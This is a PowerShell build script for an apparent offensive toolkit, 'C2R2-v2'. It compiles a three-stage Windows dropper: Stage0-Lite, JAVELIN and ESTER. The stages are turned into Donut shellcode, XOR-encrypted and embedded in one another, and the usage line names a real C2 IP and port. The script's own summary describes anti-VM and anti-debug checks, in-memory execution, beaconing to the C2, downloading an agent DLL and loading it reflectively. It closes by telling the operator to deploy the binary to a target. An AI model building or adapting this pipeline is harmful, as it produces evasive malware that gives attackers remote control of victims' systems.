#!/usr/bin/env pwsh
# build-multistage.ps1 - Full ESTER -> JAVELIN -> Stage0-Lite pipeline (Windows native)
#
# Pipeline:
#   [1/5] stage0-lite: C -> exe -> Donut shellcode -> XOR-encrypt -> stage0_payload.bin
#   [2/5] JAVELIN:     Rust (embeds stage0_payload.bin) -> javelin.exe
#   [3/5] Donut:       javelin.exe -> javelin.bin  (PIC shellcode)
#   [4/5] Embed:       XOR-encrypt javelin.bin -> regenerate ester/src/config.rs
#   [5/5] ESTER:       Rust (embeds config.rs payload) -> ester.exe -> dist\ester.exe
#
# Usage:
#   .\build-multistage.ps1 -Ip 45.154.98.72 -Port 4444
#   .\build-multistage.ps1 -Ip 45.154.98.72 -Port 4444 -ApiPort 5555 -Production

param(
    [Parameter(Mandatory=$true)]
    [string]$Ip,

    [int]   $Port       = 4444,
    [int]   $ApiPort    = 5555,
    [switch]$Production
)

$ErrorActionPreference = "Stop"

$RepoRoot = $PSScriptRoot
$DistDir  = Join-Path $RepoRoot "dist"
$DonutExe = Join-Path $RepoRoot "donut_v1.1\donut.exe"

$ModeStr = if ($Production) { "PRODUCTION" } else { "DEV" }

Write-Host ""
Write-Host "#=============================================================" -ForegroundColor Cyan
Write-Host "#  C2R2-v2  Multi-Stage Builder  (Windows native)            " -ForegroundColor Cyan
Write-Host "#  ESTER -> JAVELIN -> Stage0-Lite -> C2                     " -ForegroundColor Cyan
Write-Host "#=============================================================" -ForegroundColor Cyan
Write-Host " C2       : ${Ip}:${Port}" -ForegroundColor White
Write-Host " API Port : $ApiPort" -ForegroundColor White
Write-Host " Mode     : $ModeStr" -ForegroundColor White
Write-Host ""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

function Step([int]$n, [int]$total, [string]$msg) {
    Write-Host ""
    Write-Host "[$n/$total] $msg" -ForegroundColor Yellow
    Write-Host ("-" * 60) -ForegroundColor DarkGray
}

function Die([string]$msg) {
    Write-Host ""
    Write-Host "FATAL: $msg" -ForegroundColor Red
    exit 1
}

function XorEncrypt([byte[]]$data, [byte[]]$key) {
    $out = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $out[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $out
}

function GenerateRandomKey([int]$len) {
    $key = New-Object byte[] $len
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $rng.GetBytes($key)
    $rng.Dispose()
    return $key
}

function FormatByteArrayRust([byte[]]$data) {
    $sb = [System.Text.StringBuilder]::new()
    [void]$sb.AppendLine("[")
    $i = 0
    while ($i -lt $data.Length) {
        [void]$sb.Append("    ")
        $end = [math]::Min($i + 16, $data.Length)
        $chunk = $data[$i..($end-1)]
        [void]$sb.Append(($chunk | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", ")
        [void]$sb.AppendLine(",")
        $i = $end
    }
    [void]$sb.Append("]")
    return $sb.ToString()
}

# ---------------------------------------------------------------------------
# Pre-flight checks
# ---------------------------------------------------------------------------

New-Item -ItemType Directory -Path $DistDir -Force | Out-Null

if (-not (Test-Path $DonutExe)) {
    Die "donut.exe not found at $DonutExe`n  Download from https://github.com/TheWover/donut/releases"
}
Write-Host "donut.exe : $DonutExe" -ForegroundColor DarkGray

# Check MSVC target
$hasTarget = rustup target list --installed 2>&1 | Select-String "x86_64-pc-windows-msvc"
if (-not $hasTarget) {
    Write-Host "Installing x86_64-pc-windows-msvc target..." -ForegroundColor Yellow
    rustup target add x86_64-pc-windows-msvc
}

# ---------------------------------------------------------------------------
# [1/5] stage0-lite: C -> shellcode -> XOR-encrypt -> stage0_payload.bin
# ---------------------------------------------------------------------------

Step 1 5 "Building Stage0-Lite (C/WinHTTP -> Donut shellcode)"

$stage0Script = Join-Path $RepoRoot "stages\stage0-lite\build.ps1"
if (-not (Test-Path $stage0Script)) {
    Die "stages\stage0-lite\build.ps1 not found"
}

$s0Args = @("-ExecutionPolicy", "Bypass", "-File", $stage0Script, "-Ip", $Ip, "-Port", $Port, "-ApiPort", $ApiPort)
if ($Production) { $s0Args += "-Production" }

& powershell @s0Args
if ($LASTEXITCODE -ne 0) { Die "stage0-lite build failed (exit $LASTEXITCODE)" }

$stage0Payload = Join-Path $RepoRoot "stages\javelin\src\stage0_payload.bin"
if (-not (Test-Path $stage0Payload)) {
    Die "stages\javelin\src\stage0_payload.bin not found after stage0-lite build"
}
$s0KB = [math]::Round((Get-Item $stage0Payload).Length / 1KB, 1)
Write-Host "" 
Write-Host "  -> stage0_payload.bin : $s0KB KB" -ForegroundColor Green

# ---------------------------------------------------------------------------
# [2/5] JAVELIN: cargo build -> javelin.exe
# ---------------------------------------------------------------------------

Step 2 5 "Building JAVELIN (Rust in-memory loader, embeds Stage0-Lite)"

Push-Location $RepoRoot

$jArgs = @("build", "--release", "--target", "x86_64-pc-windows-msvc", "--package", "javelin")
if ($Production) {
    $jArgs += "--no-default-features"
    $jArgs += "--features"
    $jArgs += "production"
} else {
    $jArgs += "--features"
    $jArgs += "dev"
}

Write-Host "  cargo $($jArgs -join ' ')" -ForegroundColor DarkGray
& cargo @jArgs
if ($LASTEXITCODE -ne 0) { Pop-Location; Die "JAVELIN build failed" }

$javelinExe = Join-Path $RepoRoot "target\x86_64-pc-windows-msvc\release\javelin.exe"
if (-not (Test-Path $javelinExe)) { Pop-Location; Die "javelin.exe not found at $javelinExe" }

$jExeKB = [math]::Round((Get-Item $javelinExe).Length / 1KB, 1)
Write-Host "  -> javelin.exe : $jExeKB KB" -ForegroundColor Green

Pop-Location

# ---------------------------------------------------------------------------
# [3/5] Donut: javelin.exe -> javelin.bin  (PIC shellcode)
# ---------------------------------------------------------------------------

Step 3 5 "Converting JAVELIN EXE to PIC shellcode with Donut"

$javelinBin = Join-Path $DistDir "javelin.bin"

Write-Host "  donut -i javelin.exe -o javelin.bin -a 2 -f 1 -x 1 -e 3 -t" -ForegroundColor DarkGray
# -x 1 = ExitThread (not ExitProcess). After JAVELIN's main() completes, only
# the JAVELIN thread exits. The host process (ESTER) stays alive via its own
# infinite loop, allowing the agent beacon thread to keep running.
& $DonutExe -i $javelinExe -o $javelinBin -a 2 -f 1 -x 1 -e 3 -t
if ($LASTEXITCODE -ne 0) { Die "Donut conversion failed (exit $LASTEXITCODE)" }

if (-not (Test-Path $javelinBin)) { Die "javelin.bin not generated by Donut" }
$jBinKB = [math]::Round((Get-Item $javelinBin).Length / 1KB, 1)
Write-Host "  -> javelin.bin : $jBinKB KB" -ForegroundColor Green

# ---------------------------------------------------------------------------
# [4/5] Embed: XOR-encrypt javelin.bin -> ester/src/config.rs
# ---------------------------------------------------------------------------

Step 4 5 "Encrypting JAVELIN shellcode and embedding into ESTER config"

$javelinBytes    = [System.IO.File]::ReadAllBytes($javelinBin)
$javelinKey      = GenerateRandomKey 32
$encryptedJavelin = XorEncrypt $javelinBytes $javelinKey

$payloadLiteral  = FormatByteArrayRust $encryptedJavelin
$keyLiteral      = FormatByteArrayRust $javelinKey

$markerLine = 'pub static STAGE_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE1_CONFIG_MARKER___\0\0\0\0";'

$configContent = @"
//! Configuration for Stage 1 (ESTER)
//! AUTO-GENERATED by build-multistage.ps1 -- do not edit manually
//! Regenerated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")  C2: ${Ip}:${Port}
pub const ENCRYPTED_JAVELIN: &[u8] = &$payloadLiteral;
pub const JAVELIN_XOR_KEY: &[u8] = &$keyLiteral;
pub const JAVELIN_DOWNLOAD_URL: &str = "";

#[used]
#[no_mangle]
$markerLine
"@

$esterConfigPath = Join-Path $RepoRoot "stages\ester\src\config.rs"
[System.IO.File]::WriteAllText($esterConfigPath, $configContent, [System.Text.Encoding]::UTF8)

$encKB = [math]::Round($encryptedJavelin.Length / 1KB, 1)
Write-Host "  Encrypted payload : $encKB KB" -ForegroundColor Green
Write-Host "  Key               : $($javelinKey.Length) bytes (random)" -ForegroundColor Green
Write-Host "  -> stages\ester\src\config.rs regenerated" -ForegroundColor Green

# ---------------------------------------------------------------------------
# [5/5] ESTER: cargo build -> ester.exe -> dist\ester.exe
# ---------------------------------------------------------------------------

Step 5 5 "Building ESTER (Stage 1 dropper, embeds JAVELIN)"

Push-Location $RepoRoot

$eArgs = @("build", "--release", "--target", "x86_64-pc-windows-msvc", "--package", "ester")
if ($Production) {
    $eArgs += "--no-default-features"
    $eArgs += "--features"
    $eArgs += "production"
} else {
    $eArgs += "--features"
    $eArgs += "dev"
}

Write-Host "  cargo $($eArgs -join ' ')" -ForegroundColor DarkGray
& cargo @eArgs
if ($LASTEXITCODE -ne 0) { Pop-Location; Die "ESTER build failed" }

$esterSource = Join-Path $RepoRoot "target\x86_64-pc-windows-msvc\release\ester.exe"
if (-not (Test-Path $esterSource)) { Pop-Location; Die "ester.exe not found at $esterSource" }

$esterDest = Join-Path $DistDir "ester.exe"
Copy-Item $esterSource $esterDest -Force

Pop-Location

$esterKB = [math]::Round((Get-Item $esterDest).Length / 1KB, 1)
Write-Host "  -> dist\ester.exe : $esterKB KB" -ForegroundColor Green

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

Write-Host ""
Write-Host "#=====================================================" -ForegroundColor Green
Write-Host "#  BUILD COMPLETE                                     " -ForegroundColor Green
Write-Host "#=====================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  C2      : ${Ip}:${Port}" -ForegroundColor White
Write-Host "  Mode    : $ModeStr" -ForegroundColor White
Write-Host ""
Write-Host "Artifacts in dist\:" -ForegroundColor Cyan

$artifacts = @(
    @{ Name = "stage0_lite.bin"; Desc = "Stage0-Lite shellcode (Donut PIC)" },
    @{ Name = "javelin.bin";     Desc = "JAVELIN shellcode (Donut PIC)" },
    @{ Name = "ester.exe";       Desc = "ESTER - final delivery binary" }
)

foreach ($a in $artifacts) {
    $p = Join-Path $DistDir $a.Name
    if (Test-Path $p) {
        $kb = [math]::Round((Get-Item $p).Length / 1KB, 1)
        Write-Host ("  {0,-22} {1,8} KB   {2}" -f $a.Name, $kb, $a.Desc) -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "Execution flow:" -ForegroundColor Cyan
Write-Host "  ester.exe"
Write-Host "    -> validates environment (anti-VM, anti-debug, 3s delay)"
Write-Host "    -> decrypts + executes JAVELIN in memory"
Write-Host "       -> decrypts + executes Stage0-Lite shellcode in memory"
Write-Host "          -> contacts C2 at ${Ip}:${Port}"
Write-Host "          -> downloads agent DLL via /api/stage1/agent_dll"
Write-Host "          -> reflectively loads agent in memory"
Write-Host ""
Write-Host "Deploy ester.exe to target and ensure C2 is listening at ${Ip}:${Port}" -ForegroundColor Yellow
Write-Host ""
